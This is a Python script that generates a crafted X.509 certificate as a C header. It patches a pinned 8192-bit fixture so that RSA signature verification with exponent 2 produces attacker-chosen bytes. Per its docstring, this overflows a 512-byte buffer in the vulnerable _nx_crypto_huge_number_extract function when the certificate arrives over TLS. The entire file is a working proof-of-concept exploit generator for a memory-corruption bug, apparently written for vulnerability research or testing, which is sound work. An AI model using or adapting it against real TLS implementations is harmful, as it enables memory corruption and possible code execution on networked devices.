#!/usr/bin/env python3
"""Derive a TLS-served certificate carrying the W1 chosen-byte RSA construction.

Patches the pinned upstream 8192-bit self-signed fixture in place (same DER
lengths, so no TLV length fields change):
  - RSA modulus  -> n = s^2 - T
  - RSA exponent -> e = 2
  - signature    -> s (512 B) left-padded to the original 1024 B field

Then s^e mod n = s^2 mod (s^2 - T) = T, so the vulnerable
_nx_crypto_huge_number_extract writes the chosen T into decrypted_signature[512]
with T[512:520] = deadbeefcafebabe. This is a network-arrived Certificate
message, not the direct-call/gdb manual mode of harness/evidence-w1.
"""
import re
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
SRC = HERE.parent / "nx_oversized_key_test_data.h"
OUT = Path(sys.argv[2]) if len(sys.argv) > 2 else HERE / "nx_crafted_key_test_data.h"
CHOSEN = bytes.fromhex(sys.argv[1]) if len(sys.argv) > 1 else bytes.fromhex("deadbeefcafebabe")

S = bytes([0x40]) + bytes([0xFF]) * 511
T = bytearray(1024)
T[0] = 0x01
T[512:520] = CHOSEN
s = int.from_bytes(S, "big")
n = (s * s - int.from_bytes(T, "big")).to_bytes(1024, "big")
assert (s * s) % int.from_bytes(n, "big") == int.from_bytes(T, "big")

txt = SRC.read_text()
m = re.search(r"oversized_cert_der\[\]\s*=\s*\{(.*?)\};", txt, re.S)
der = bytearray(int(x, 16) for x in re.findall(r"0x([0-9a-fA-F]{2})", m.group(1)))
assert len(der) == 2317

# Offsets from the TLV walk of the pinned fixture (see wake W3 wall):
#   modulus INTEGER value @158 (1025 B: 0x00 || 1024 B magnitude)
#   exponent INTEGER value @1185 (3 B)
#   signature BIT-STRING value @1292 (unused-bits byte), bytes @1293 (1024 B)
assert der[158] == 0x00 and der[159] == 0x9C
assert der[1185:1188] == bytes.fromhex("010001")
assert der[1292] == 0x00  # BIT STRING unused-bits byte
der[158:1183] = b"\x00" + n
der[1185:1188] = bytes.fromhex("000002")
der[1293:2317] = b"\x00" * 512 + S
lines = [
    "/* Generated by gen-crafted-cert.py -- do not edit by hand. */",
    "/* Pinned 8192-bit fixture with modulus/exponent/signature replaced so",
    "   s^e mod n = T and T[512:520] = deadbeefcafebabe. Same DER lengths. */",
    "static const unsigned char crafted_cert_der[] = {",
]
for i in range(0, len(der), 12):
    lines.append("    " + " ".join(f"0x{b:02x}," for b in der[i:i+12]))
lines += [
    "};",
    "static const unsigned int crafted_cert_der_len = %d;" % len(der),
    "",
]
OUT.write_text("\n".join(lines))
print(f"wrote {OUT} ({len(der)} bytes); modulus bits={int.from_bytes(n,'big').bit_length()}")
